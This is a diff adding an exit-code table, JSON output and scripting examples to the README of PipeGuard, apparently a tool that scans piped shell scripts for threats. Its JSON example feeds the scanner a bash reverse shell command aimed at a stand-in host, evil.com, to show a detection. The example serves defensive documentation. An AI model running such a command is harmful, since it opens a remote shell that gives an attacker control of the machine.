@@ -241,6 +241,53 @@ pipeguard update cleanup
 
 ---
 
+## Exit Codes
+
+PipeGuard uses distinct exit codes for scripting and CI integration:
+
+| Code | Constant | Meaning |
+|------|----------|---------|
+| `0` | `EXIT_CLEAN` | No threats detected |
+| `1` | `EXIT_THREAT` | Threat detected |
+| `2` | `EXIT_ERROR` | Runtime error (bad args, missing rules, I/O failure) |
+| `3` | `EXIT_UPDATE_AVAILABLE` | Update check found a newer version |
+
+### JSON Output
+
+Use `-F json` for machine-readable scan results:
+
+```bash
+echo 'bash -i >& /dev/tcp/evil.com/4444 0>&1' | pipeguard scan -F json
+```
+
+```json
+{
+  "threat_detected": true,
+  "severity": 10,
+  "matches": [
+    {
+      "rule": "reverse_shell_bash_tcp",
+      "category": "reverse_shell",
+      "severity": 10,
+      "description": "Bash reverse shell via /dev/tcp"
+    }
+  ]
+}
+```
+
+### Scripting Example
+
+```bash
+pipeguard scan --rules rules/core.yar < script.sh
+case $? in
+  0) echo "Clean" ;;
+  1) echo "Threat blocked" ;;
+  2) echo "Scan error" ;;
+esac
+```
+
+---
+
 ## Status
 
 **Implementation Complete. Testing in Progress.**
